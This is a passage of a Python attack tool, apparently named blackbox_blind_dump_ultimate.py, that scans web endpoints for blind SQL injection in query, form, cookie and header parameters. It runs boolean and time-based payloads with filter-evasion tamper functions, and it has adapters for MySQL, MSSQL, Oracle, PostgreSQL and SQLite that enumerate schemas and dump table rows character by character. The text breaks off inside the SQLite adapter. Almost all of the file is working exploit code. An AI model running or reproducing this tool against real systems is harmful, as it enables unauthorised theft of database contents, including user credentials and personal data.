#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
blackbox_blind_dump_ultimate.py
--------------------------------
Blackbox boolean/time-blind SQLi scanner & dumper supporting:
- Injection locations: URL query (GET), POST form, COOKIEs, and HTTP headers
- TRUE oracles: body text marker (--true-text), HTTP status (--true-status),
  header substrings (--true-header "Header: contains"), OR fallback to body-length delta
- DBMS:
    * Full enum+dump: MySQL, MSSQL, Oracle, PostgreSQL, SQLite
    * Basic schema graph (FK) for all 5 engines
- Probes: AND/OR in string & numeric contexts; optional time-based (best effort)
- Tamper/Bypass chain: randomcase, space2comment, space2plus, inlinecomment,
  newline_comment, urlencode, double_urlencode

Outputs:
- Dumps as CSV under --outdir (default: blackbox_dumps/)
- Schema (tables/columns + foreign keys) as CSVs & a simple DOT graph
"""

import argparse, time, csv, os, sys, re, random
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Callable
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote, quote_plus
import requests

# -------------------- small utils --------------------

def dict_merge(a: Dict[str,str], b: Dict[str,str]) -> Dict[str,str]:
    c = dict(a); c.update(b); return c

def build_get_url(url: str, params: Dict[str,str]) -> str:
    parts = list(urlparse(url))
    qs = dict(parse_qsl(parts[4], keep_blank_values=True))
    qs.update(params)
    parts[4] = urlencode(qs, doseq=True)
    return urlunparse(parts)

def parse_query_dict(url: str) -> Dict[str,str]:
    return dict(parse_qsl(urlparse(url).query, keep_blank_values=True))

def parse_cookie_header(header: str) -> Dict[str,str]:
    d = {}
    if not header: return d
    for kv in header.split(";"):
        kv = kv.strip()
        if not kv: continue
        if "=" in kv:
            k,v = kv.split("=",1)
            d[k.strip()] = v.strip()
    return d

def cookies_to_header(cookies: Dict[str,str]) -> str:
    return "; ".join([f"{k}={v}" for k,v in cookies.items()])

def diff_ratio(a: str, b: str) -> float:
    if not a and not b: return 0.0
    return abs(len(a)-len(b))/max(1, max(len(a),len(b)))

# -------------------- payload tamper chain --------------------

def tamper_randomcase(s: str) -> str:
    out = []
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if random.random()<0.5 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)

def tamper_space2comment(s: str) -> str:
    return s.replace(" ", "/**/")

def tamper_space2plus(s: str) -> str:
    return s.replace(" ", "+")

def tamper_inlinecomment(s: str) -> str:
    # Insert /**/ around keywords AND/OR/SELECT/WHERE (case-insensitive)
    def repl(m): return "/**/" + m.group(0) + "/**/"
    return re.sub(r"(?i)\b(AND|OR|SELECT|WHERE|FROM|UNION|SLEEP|PG_SLEEP|DBMS_LOCK\.SLEEP)\b", repl, s)

def tamper_newline_comment(s: str) -> str:
    return s.replace("-- -", "--%0A").replace("--  -", "--%0A")

def tamper_urlencode(s: str) -> str:
    return quote(s, safe="")

def tamper_double_urlencode(s: str) -> str:
    return quote(quote(s, safe=""), safe="")

TAMPER_MAP = {
    "randomcase": tamper_randomcase,
    "space2comment": tamper_space2comment,
    "space2plus": tamper_space2plus,
    "inlinecomment": tamper_inlinecomment,
    "newline_comment": tamper_newline_comment,
    "urlencode": tamper_urlencode,
    "double_urlencode": tamper_double_urlencode,
}

def compose_tamper(names: List[str]) -> Callable[[str], str]:
    funcs = [TAMPER_MAP[n] for n in names if n in TAMPER_MAP]
    def apply_all(s: str) -> str:
        for f in funcs:
            s = f(s)
        return s
    return apply_all

# -------------------- models --------------------

@dataclass
class Endpoint:
    url: str
    method: str = "GET"
    data: Dict[str,str] = None
    cookies: Dict[str,str] = None
    headers: Dict[str,str] = None

@dataclass
class Finding:
    location: str        # 'get' | 'post' | 'cookie' | 'header'
    param: str           # param name or header name
    kind: str            # 'string' | 'numeric'
    mode: str            # description
    baseline_len: int

@dataclass
class Resp:
    status: int
    headers: Dict[str,str]
    body: str

    @property
    def length(self) -> int:
        return len(self.body or "")

# -------------------- HTTP client --------------------

class Client:
    def __init__(self, ep: Endpoint, timeout: float=20.0, req_delay: float=0.0):
        self.ep = ep
        self.sess = requests.Session()
        if ep.headers:
            self.sess.headers.update(ep.headers)
        if ep.cookies:
            self.sess.cookies.update(ep.cookies)
        self.timeout = timeout
        self.req_delay = req_delay

    def request(self, params: Dict[str,str], data: Dict[str,str],
                cookies_override: Optional[Dict[str,str]]=None,
                headers_override: Optional[Dict[str,str]]=None) -> Resp:
        if self.ep.method.upper() == "POST":
            r = self.sess.post(self.ep.url, data=dict_merge(self.ep.data or {}, data or {}),
                               timeout=self.timeout,
                               cookies=cookies_override,
                               headers=headers_override)
        else:
            url = build_get_url(self.ep.url, params or {})
            r = self.sess.get(url, timeout=self.timeout,
                              cookies=cookies_override, headers=headers_override)
        if self.req_delay > 0:
            time.sleep(self.req_delay)
        return Resp(r.status_code, {k.lower(): v for k,v in r.headers.items()}, r.text)

# -------------------- payload helpers --------------------

def make_payload_AND(val: str, expr: str, kind: str) -> str:
    if kind == "string":
        return f"{val}' AND ({expr}) -- -"
    else:
        return f"{val} AND ({expr})"

def make_payload_OR(val: str, expr: str, kind: str) -> str:
    if kind == "string":
        return f"{val}' OR ({expr}) -- -"
    else:
        return f"{val} OR ({expr})"

# -------------------- marker evaluator --------------------

class Marker:
    def __init__(self, true_text: Optional[str], true_status: Optional[int], true_headers: List[Tuple[str,str]], tolerance: float):
        self.true_text = true_text
        self.true_status = true_status
        self.true_headers = [(k.lower(), v) for k,v in true_headers]
        self.tolerance = tolerance

    def match_markers(self, r: Resp) -> Optional[bool]:
        any_marker = self.true_text is not None or self.true_status is not None or bool(self.true_headers)
        if not any_marker:
            return None
        if self.true_status is not None and self.true_status != r.status:
            return False
        if self.true_text is not None and (self.true_text not in (r.body or "")):
            return False
        for hk, sub in self.true_headers:
            hv = r.headers.get(hk, "")
            if sub not in hv:
                return False
        return True

# -------------------- try a single parameter in a chosen location --------------------

def try_param(client: Client, location: str, param: str, base_params: Dict[str,str], base_data: Dict[str,str], base_cookies: Dict[str,str], base_headers: Dict[str,str], value: str, tamper: Callable[[str],str]) -> Resp:
    v = tamper(value) if tamper else value
    if location == "get":
        p = dict(base_params); p[param] = v
        return client.request(p, {}, None if base_cookies is None else base_cookies, None)
    elif location == "post":
        d = dict(base_data); d[param] = v
        return client.request({}, d, None if base_cookies is None else base_cookies, None)
    elif location == "cookie":
        c = dict(base_cookies or {}); c[param] = v
        return client.request(base_params, base_data, c, None)
    elif location == "header":
        h = dict(base_headers or {}); h[param] = v
        return client.request(base_params, base_data, base_cookies, h)
    else:
        raise ValueError("unknown location")

# -------------------- probing --------------------

def probe(client: Client, marker: Marker, location: str, param: str,
          base_params: Dict[str,str], base_data: Dict[str,str], base_cookies: Dict[str,str], base_headers: Dict[str,str],
          baseline_v: str, tolerance: float, delay_sec: float, tamper: Callable[[str],str]) -> Optional[Finding]:
    """Return Finding if injectable, else None."""

    def is_truefalse(rt: Resp, rf: Resp) -> bool:
        mk_t = marker.match_markers(rt)
        mk_f = marker.match_markers(rf)
        if mk_t is not None and mk_f is not None:
            return mk_t is True and mk_f is False
        return diff_ratio(rt.body, rf.body) >= tolerance

    # boolean (string) AND
    rt = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_AND(baseline_v, "1=1", "string"), tamper)
    rf = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_AND(baseline_v, "1=2", "string"), tamper)
    if is_truefalse(rt, rf):
        return Finding(location, param, "string", "boolean (string AND)", len(rt.body))

    # boolean (numeric) AND
    rt = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_AND(baseline_v, "1=1", "numeric"), tamper)
    rf = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_AND(baseline_v, "1=2", "numeric"), tamper)
    if is_truefalse(rt, rf):
        return Finding(location, param, "numeric", "boolean (numeric AND)", len(rt.body))

    # boolean (string) OR
    rt = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_OR(baseline_v, "1=1", "string"), tamper)
    rf = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_OR(baseline_v, "1=2", "string"), tamper)
    if is_truefalse(rt, rf):
        return Finding(location, param, "string", "boolean (string OR)", len(rt.body))

    # boolean (numeric) OR
    rt = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_OR(baseline_v, "1=1", "numeric"), tamper)
    rf = try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_OR(baseline_v, "1=2", "numeric"), tamper)
    if is_truefalse(rt, rf):
        return Finding(location, param, "numeric", "boolean (numeric OR)", len(rt.body))

    # time-based best-effort
    for expr in (f"SLEEP({delay_sec})", f"pg_sleep({delay_sec})", f"dbms_lock.sleep({delay_sec})"):
        t0 = time.time()
        try_param(client, location, param, base_params, base_data, base_cookies, base_headers, make_payload_AND(baseline_v, expr, "numeric"), tamper)
        dt = time.time() - t0
        if dt >= delay_sec * 0.8:
            return Finding(location, param, "numeric", f"time-based AND (~{dt:.2f}s via {expr.split('(')[0]})", 0)

    return None

# -------------------- Boolean-Oracle for binary search --------------------

class OracleBool:
    def __init__(self, client: Client, marker: Marker, location: str, param: str, baseline_v: str,
                 kind: str, base_params: Dict[str,str], base_data: Dict[str,str], base_cookies: Dict[str,str], base_headers: Dict[str,str], tamper: Callable[[str],str]):
        self.client = client
        self.marker = marker
        self.location = location
        self.param = param
        self.baseline_v = baseline_v
        self.kind = kind
        self.base_params = base_params
        self.base_data = base_data
        self.base_cookies = base_cookies
        self.base_headers = base_headers
        self.tamper = tamper
        # Calibrate
        self._true = self._inject_AND("1=1")
        self._false = self._inject_AND("1=2")

    def _inject_AND(self, expr: str) -> Resp:
        value = make_payload_AND(self.baseline_v, expr, self.kind)
        return try_param(self.client, self.location, self.param, self.base_params, self.base_data, self.base_cookies, self.base_headers, value, self.tamper)

    def is_true(self, expr: str) -> bool:
        r = self._inject_AND(expr)
        mk = self.marker.match_markers(r)
        if mk is not None:
            return mk
        d_t = diff_ratio(r.body, self._true.body)
        d_f = diff_ratio(r.body, self._false.body)
        return d_t + self.marker.tolerance/2 < d_f

# -------------------- caps --------------------
CAP_TABLES  = 10000
CAP_COLUMNS = 10000
CAP_ROWS    = 2_000_000

# --------------- Adapters (MySQL/MSSQL/Oracle/Postgres/SQLite) ---------------

class BaseAdapter:
    name = "base"
    def __init__(self, oracle: OracleBool): self.o = oracle
    def detect(o: OracleBool) -> bool: raise NotImplementedError
    def list_tables(self) -> List[str]: raise NotImplementedError
    def list_columns(self, table: str) -> List[str]: raise NotImplementedError
    def rowcount(self, table: str) -> int: raise NotImplementedError
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]: raise NotImplementedError
    def relationships(self) -> List[Tuple[str,str,str,str,str]]: return []

class MySQLAdapter(BaseAdapter):
    name = "mysql"
    @staticmethod
    def detect(o: OracleBool) -> bool:
        try: return o.is_true("ASCII(SUBSTRING(database(),1,1))>0")
        except Exception: return False
    @staticmethod
    def _bin(o: OracleBool, expr: str, lo: int, hi: int) -> int:
        while lo < hi:
            mid = (lo + hi)//2
            if o.is_true(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo
    @staticmethod
    def _ub(o: OracleBool, expr: str, start=1, limit=CAP_TABLES) -> int:
        b = max(1, start)
        while b <= limit and o.is_true(f"({expr})>{b}"):
            b *= 2
        return min(b, limit)
    def strlen(self, s: str, maxlen=4096) -> int:
        ub = self._ub(self.o, f"IFNULL(LENGTH(({s})),0)", 1, maxlen)
        return self._bin(self.o, f"IFNULL(LENGTH(({s})),0)", 0, ub)
    def chrat(self, s: str, pos: int) -> int:
        return self._bin(self.o, f"IFNULL(ASCII(SUBSTRING(({s}),{pos},1)),0)", 0, 256)
    def get_string(self, s: str, maxlen=2048) -> str:
        n = self.strlen(s, maxlen=maxlen)
        if n == 0: return ""
        return "".join(chr(self.chrat(s, i)) for i in range(1, n+1))
    def list_tables(self) -> List[str]:
        cnt_expr = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_TABLES))
        names, blanks = [], 0
        for off in range(min(cnt, CAP_TABLES)):
            expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET {off})"
            name = self.get_string(expr, 256)
            if not name:
                blanks += 1
                if blanks > 10: break
            else:
                names.append(name); blanks = 0
        return names
    def list_columns(self, table: str) -> List[str]:
        t = table.replace("\\","\\\\").replace("'","\\'")
        cnt_expr = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='{t}'"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_COLUMNS))
        cols, blanks = [], 0
        for off in range(min(cnt, CAP_COLUMNS)):
            expr = f"(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{t}' ORDER BY ordinal_position LIMIT 1 OFFSET {off})"
            col = self.get_string(expr, 128)
            if not col:
                blanks += 1
                if blanks > 10: break
            else:
                cols.append(col); blanks = 0
        return cols
    def rowcount(self, table: str) -> int:
        return self._bin(self.o, f"SELECT COUNT(*) FROM `{table}`", 0, self._ub(self.o, f"SELECT COUNT(*) FROM `{table}`", 1, CAP_ROWS))
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]:
        total = min(self.rowcount(table), max_rows) if max_rows>0 else self.rowcount(table)
        order = cols[0] if cols else "1"
        rows = []
        for off in range(total):
            row = []
            for c in cols:
                cell = f"(SELECT LOWER(HEX(CAST(`{c}` AS CHAR))) FROM `{table}` ORDER BY `{order}` LIMIT 1 OFFSET {off})"
                hx = self.get_string(cell, 4096)
                try:
                    row.append(bytes.fromhex(hx).decode('utf-8', errors='replace') if hx else "")
                except Exception:
                    row.append(hx)
            rows.append(row)
            print(f"[dump-mysql] {table} {off+1}/{total}", end="\r")
        print()
        return rows
    def relationships(self) -> List[Tuple[str,str,str,str,str]]:
        rels = []
        cnt_expr = "SELECT COUNT(*) FROM information_schema.KEY_COLUMN_USAGE WHERE table_schema=database() AND referenced_table_name IS NOT NULL"
        n = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, 100000))
        for off in range(n):
            expr = ("(SELECT CONCAT(table_name,':',column_name,':',referenced_table_name,':',referenced_column_name,':',constraint_name) "
                    "FROM information_schema.KEY_COLUMN_USAGE "
                    "WHERE table_schema=database() AND referenced_table_name IS NOT NULL "
                    f"ORDER BY table_name,ordinal_position LIMIT 1 OFFSET {off})")
            s = self.get_string(expr, 1024)
            if s and s.count(':')>=4:
                t,c,rt,rc,cn = s.split(":",4)
                rels.append((t,c,rt,rc,cn))
        return rels

class MSSQLAdapter(BaseAdapter):
    name = "mssql"
    @staticmethod
    def detect(o: OracleBool) -> bool:
        try: return o.is_true("ASCII(SUBSTRING(DB_NAME(),1,1))>0")
        except Exception: return False
    @staticmethod
    def _bin(o: OracleBool, expr: str, lo: int, hi: int) -> int:
        while lo < hi:
            mid = (lo + hi)//2
            if o.is_true(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo
    @staticmethod
    def _ub(o: OracleBool, expr: str, start=1, limit=CAP_TABLES) -> int:
        b = max(1, start)
        while b <= limit and o.is_true(f"({expr})>{b}"):
            b *= 2
        return min(b, limit)
    def strlen(self, s: str, maxlen=4096) -> int:
        ub = self._ub(self.o, f"(SELECT LEN(({s})))", 1, maxlen)
        return self._bin(self.o, f"(SELECT LEN(({s})))", 0, ub)
    def chrat(self, s: str, pos: int) -> int:
        return self._bin(self.o, f"(SELECT ASCII(SUBSTRING(({s}),{pos},1)))", 0, 256)
    def get_string(self, s: str, maxlen=2048) -> str:
        n = self.strlen(s, maxlen=maxlen)
        if n == 0: return ""
        return "".join(chr(self.chrat(s, i)) for i in range(1, n+1))
    def list_tables(self) -> List[str]:
        cnt_expr = "(SELECT COUNT(*) FROM sys.tables)"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_TABLES))
        names, blanks = [], 0
        for off in range(min(cnt, CAP_TABLES)):
            expr = f"(SELECT name FROM sys.tables ORDER BY name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = self.get_string(expr, 256)
            if not name:
                blanks += 1
                if blanks > 10: break
            else:
                names.append(name); blanks = 0
        return names
    def list_columns(self, table: str) -> List[str]:
        t = table.replace("'", "''")
        cnt_expr = f"(SELECT COUNT(*) FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='{t}')"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_COLUMNS))
        cols, blanks = [], 0
        for off in range(min(cnt, CAP_COLUMNS)):
            expr = f"(SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='{t}' ORDER BY c.column_id OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            col = self.get_string(expr, 128)
            if not col:
                blanks += 1
                if blanks > 10: break
            else:
                cols.append(col); blanks = 0
        return cols
    def rowcount(self, table: str) -> int:
        return self._bin(self.o, f"(SELECT COUNT(*) FROM [{table}])", 0, self._ub(self.o, f"(SELECT COUNT(*) FROM [{table}])", 1, CAP_ROWS))
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]:
        total = min(self.rowcount(table), max_rows) if max_rows>0 else self.rowcount(table)
        order = cols[0] if cols else "1"
        rows = []
        for off in range(total):
            row = []
            for c in cols:
                expr = f"(SELECT CONVERT(VARCHAR(4000), [{c}]) FROM [{table}] ORDER BY [{order}] OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
                row.append(self.get_string(expr, 4096))
            rows.append(row)
            print(f"[dump-mssql] {table} {off+1}/{total}", end="\r")
        print()
        return rows
    def relationships(self) -> List[Tuple[str,str,str,str,str]]:
        rels = []
        cnt_expr = "(SELECT COUNT(*) FROM sys.foreign_keys)"
        n = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, 100000))
        for off in range(n):
            expr = (
                "(SELECT "
                "  (SELECT t1.name FROM sys.tables t1 WHERE t1.object_id=fk.parent_object_id)+':'+"
                "  (SELECT c1.name FROM sys.columns c1 WHERE c1.object_id=fkc.parent_object_id AND c1.column_id=fkc.parent_column_id)+':'+"
                "  (SELECT t2.name FROM sys.tables t2 WHERE t2.object_id=fk.referenced_object_id)+':'+"
                "  (SELECT c2.name FROM sys.columns c2 WHERE c2.object_id=fkc.referenced_object_id AND c2.column_id=fkc.referenced_column_id)+':'+"
                "  fk.name "
                "FROM sys.foreign_keys fk "
                "JOIN sys.foreign_key_columns fkc ON fk.object_id=fkc.constraint_object_id "
                f"ORDER BY fk.name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            )
            s = self.get_string(expr, 1024)
            if s and s.count(':')>=4:
                t,c,rt,rc,cn = s.split(':',4); rels.append((t,c,rt,rc,cn))
        return rels

class OracleAdapter(BaseAdapter):
    name = "oracle"
    @staticmethod
    def detect(o: OracleBool) -> bool:
        try: return o.is_true("ASCII(SUBSTR((SELECT user FROM dual),1,1))>0")
        except Exception: return False
    @staticmethod
    def _bin(o: OracleBool, expr: str, lo: int, hi: int) -> int:
        while lo < hi:
            mid = (lo + hi)//2
            if o.is_true(f"NVL(({expr}),0)>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo
    @staticmethod
    def _ub(o: OracleBool, expr: str, start=1, limit=CAP_TABLES) -> int:
        b = max(1, start)
        while b <= limit and o.is_true(f"NVL(({expr}),0)>{b}"):
            b *= 2
        return min(b, limit)
    def strlen(self, s: str, maxlen=4096) -> int:
        expr = f"(SELECT LENGTH(({s})) FROM dual)"
        ub = self._ub(self.o, expr, 1, maxlen)
        return self._bin(self.o, expr, 0, ub)
    def chrat(self, s: str, pos: int) -> int:
        return self._bin(self.o, f"(SELECT ASCII(SUBSTR(({s}),{pos},1)) FROM dual)", 0, 256)
    def get_string(self, s: str, maxlen=2048) -> str:
        n = self.strlen(s, maxlen=maxlen)
        if n == 0: return ""
        return "".join(chr(self.chrat(s, i)) for i in range(1, n+1))
    def list_tables(self) -> List[str]:
        cnt_expr = "(SELECT COUNT(*) FROM user_tables)"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_TABLES))
        names, blanks = [], 0
        for off in range(min(cnt, CAP_TABLES)):
            expr = f"(SELECT table_name FROM user_tables ORDER BY table_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = self.get_string(expr, 256)
            if not name:
                blanks += 1
                if blanks > 10: break
            else:
                names.append(name); blanks = 0
        return names
    def list_columns(self, table: str) -> List[str]:
        t = table.upper().replace("'", "''")
        cnt_expr = f"(SELECT COUNT(*) FROM user_tab_columns WHERE table_name='{t}')"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_COLUMNS))
        cols, blanks = [], 0
        for off in range(min(cnt, CAP_COLUMNS)):
            expr = f"(SELECT column_name FROM user_tab_columns WHERE table_name='{t}' ORDER BY column_id OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            col = self.get_string(expr, 128)
            if not col:
                blanks += 1
                if blanks > 10: break
            else:
                cols.append(col); blanks = 0
        return cols
    def rowcount(self, table: str) -> int:
        return self._bin(self.o, f"(SELECT COUNT(*) FROM {table})", 0, self._ub(self.o, f"(SELECT COUNT(*) FROM {table})", 1, CAP_ROWS))
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]:
        total = min(self.rowcount(table), max_rows) if max_rows>0 else self.rowcount(table)
        order = cols[0] if cols else "1"
        rows = []
        for off in range(total):
            row = []
            for c in cols:
                expr = f"(SELECT TO_CHAR({c}) FROM {table} ORDER BY {order} OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
                row.append(self.get_string(expr, 4096))
            rows.append(row)
            print(f"[dump-oracle] {table} {off+1}/{total}", end="\r")
        print()
        return rows
    def relationships(self) -> List[Tuple[str,str,str,str,str]]:
        rels = []
        cnt_expr = "(SELECT COUNT(*) FROM user_constraints WHERE constraint_type='R')"
        n = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, 100000))
        for off in range(n):
            expr = (
                "(SELECT "
                "  (SELECT table_name FROM user_constraints uc2 WHERE uc2.constraint_name=uc.r_constraint_name) ||':'|| "
                "  (SELECT column_name FROM user_cons_columns r WHERE r.constraint_name=uc.r_constraint_name AND ROWNUM=1) ||':'|| "
                "  uc.table_name ||':'|| "
                "  (SELECT column_name FROM user_cons_columns c WHERE c.constraint_name=uc.constraint_name AND ROWNUM=1) ||':'|| "
                "  uc.constraint_name "
                "FROM user_constraints uc WHERE uc.constraint_type='R' "
                f"ORDER BY uc.constraint_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY)"
            )
            s = self.get_string(expr, 1024)
            if s and s.count(':')>=4:
                rt,rc,t,c,cn = s.split(':',4)
                rels.append((t,c,rt,rc,cn))
        return rels

class PostgresAdapter(BaseAdapter):
    name = "postgres"
    @staticmethod
    def detect(o: OracleBool) -> bool:
        try: return o.is_true("ASCII(SUBSTR(current_database(),1,1))>0")
        except Exception: return False
    @staticmethod
    def _bin(o: OracleBool, expr: str, lo: int, hi: int) -> int:
        while lo < hi:
            mid = (lo + hi)//2
            if o.is_true(f"(({expr}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo
    @staticmethod
    def _ub(o: OracleBool, expr: str, start=1, limit=CAP_TABLES) -> int:
        b = max(1, start)
        while b <= limit and o.is_true(f"(({expr}))>{b}"):
            b *= 2
        return min(b, limit)
    def strlen(self, s: str, maxlen=4096) -> int:
        expr = f"COALESCE(LENGTH(({s})),0)"
        ub = self._ub(self.o, expr, 1, maxlen)
        return self._bin(self.o, expr, 0, ub)
    def chrat(self, s: str, pos: int) -> int:
        return self._bin(self.o, f"COALESCE(ASCII(SUBSTRING(({s}) FROM {pos} FOR 1)),0)", 0, 256)
    def get_string(self, s: str, maxlen=2048) -> str:
        n = self.strlen(s, maxlen=maxlen)
        if n == 0: return ""
        return "".join(chr(self.chrat(s, i)) for i in range(1, n+1))
    def list_tables(self) -> List[str]:
        cnt_expr = ("SELECT COUNT(*) FROM information_schema.tables "
                    "WHERE table_schema NOT IN ('pg_catalog','information_schema')")
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_TABLES))
        names, blanks = [], 0
        for off in range(min(cnt, CAP_TABLES)):
            expr = ("(SELECT table_schema||'.'||table_name FROM information_schema.tables "
                    "WHERE table_schema NOT IN ('pg_catalog','information_schema') "
                    f"ORDER BY table_schema, table_name LIMIT 1 OFFSET {off})")
            name = self.get_string(expr, 256)
            if not name:
                blanks += 1
                if blanks > 10: break
            else:
                names.append(name); blanks = 0
        return names
    def list_columns(self, table: str) -> List[str]:
        if '.' in table:
            schema, tname = table.split('.',1)
        else:
            schema, tname = 'public', table
        schema_q = schema.replace("'", "''")
        t_q = tname.replace("'", "''")
        cnt_expr = (f"SELECT COUNT(*) FROM information_schema.columns "
                    f"WHERE table_schema='{schema_q}' AND table_name='{t_q}'")
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_COLUMNS))
        cols, blanks = [], 0
        for off in range(min(cnt, CAP_COLUMNS)):
            expr = (f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{schema_q}' AND table_name='{t_q}' "
                    f"ORDER BY ordinal_position LIMIT 1 OFFSET {off})")
            col = self.get_string(expr, 128)
            if not col:
                blanks += 1
                if blanks>10: break
            else:
                cols.append(col); blanks=0
        return cols
    def rowcount(self, table: str) -> int:
        return self._bin(self.o, f"SELECT COUNT(*) FROM {table}", 0, self._ub(self.o, f"SELECT COUNT(*) FROM {table}", 1, CAP_ROWS))
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]:
        total = min(self.rowcount(table), max_rows) if max_rows>0 else self.rowcount(table)
        order = cols[0] if cols else "1"
        rows = []
        for off in range(total):
            row = []
            for c in cols:
                expr = f"(SELECT ({c})::text FROM {table} ORDER BY {order} LIMIT 1 OFFSET {off})"
                row.append(self.get_string(expr, 4096))
            rows.append(row)
            print(f"[dump-postgres] {table} {off+1}/{total}", end="\r")
        print()
        return rows
    def relationships(self) -> List[Tuple[str,str,str,str,str]]:
        rels = []
        cnt_expr = ("SELECT COUNT(*) FROM information_schema.table_constraints tc "
                    "WHERE tc.constraint_type='FOREIGN KEY'")
        n = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, 100000))
        for off in range(n):
            expr = (
                "(SELECT "
                " (kcu.table_schema||'.'||kcu.table_name)||':'||kcu.column_name||':'||"
                " (ccu.table_schema||'.'||ccu.table_name)||':'||ccu.column_name||':'||tc.constraint_name "
                "FROM information_schema.table_constraints tc "
                "JOIN information_schema.key_column_usage kcu ON tc.constraint_name=kcu.constraint_name AND tc.table_schema=kcu.table_schema "
                "JOIN information_schema.constraint_column_usage ccu ON tc.constraint_name=ccu.constraint_name AND tc.table_schema=ccu.table_schema "
                "WHERE tc.constraint_type='FOREIGN KEY' "
                f"ORDER BY tc.table_schema, tc.table_name, tc.constraint_name LIMIT 1 OFFSET {off})"
            )
            s = self.get_string(expr, 1024)
            if s and s.count(':')>=4:
                t,c,rt,rc,cn = s.split(':',4); rels.append((t,c,rt,rc,cn))
        return rels

class SQLiteAdapter(BaseAdapter):
    name = "sqlite"
    @staticmethod
    def detect(o: OracleBool) -> bool:
        try: return o.is_true("unicode(substr(sqlite_version(),1,1))>0")
        except Exception: return False
    @staticmethod
    def _bin(o: OracleBool, expr: str, lo: int, hi: int) -> int:
        while lo < hi:
            mid = (lo + hi)//2
            if o.is_true(f"(({expr}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo
    @staticmethod
    def _ub(o: OracleBool, expr: str, start=1, limit=CAP_TABLES) -> int:
        b = max(1, start)
        while b <= limit and o.is_true(f"(({expr}))>{b}"):
            b *= 2
        return min(b, limit)
    def strlen(self, s: str, maxlen=4096) -> int:
        expr = f"COALESCE(length(({s})),0)"
        ub = self._ub(self.o, expr, 1, maxlen)
        return self._bin(self.o, expr, 0, ub)
    def chrat(self, s: str, pos: int) -> int:
        return self._bin(self.o, f"COALESCE(unicode(substr(({s}),{pos},1)),0)", 0, 256)
    def get_string(self, s: str, maxlen=2048) -> str:
        n = self.strlen(s, maxlen=maxlen)
        if n == 0: return ""
        return "".join(chr(self.chrat(s, i)) for i in range(1, n+1))
    def list_tables(self) -> List[str]:
        cnt_expr = "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_TABLES))
        out, blanks= [],0
        for off in range(min(cnt, CAP_TABLES)):
            expr = ("(SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' "
                    f"ORDER BY name LIMIT 1 OFFSET {off})")
            name = self.get_string(expr, 256)
            if not name:
                blanks += 1
                if blanks>10: break
            else:
                out.append(name); blanks=0
        return out
    def list_columns(self, table: str) -> List[str]:
        t = table.replace("'", "''")
        cnt_expr = f"SELECT COUNT(*) FROM pragma_table_info('{t}')"
        cnt = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, CAP_COLUMNS))
        cols, blanks= [],0
        for off in range(min(cnt, CAP_COLUMNS)):
            expr = f"(SELECT name FROM pragma_table_info('{t}') ORDER BY cid LIMIT 1 OFFSET {off})"
            col = self.get_string(expr, 128)
            if not col:
                blanks += 1
                if blanks>10: break
            else:
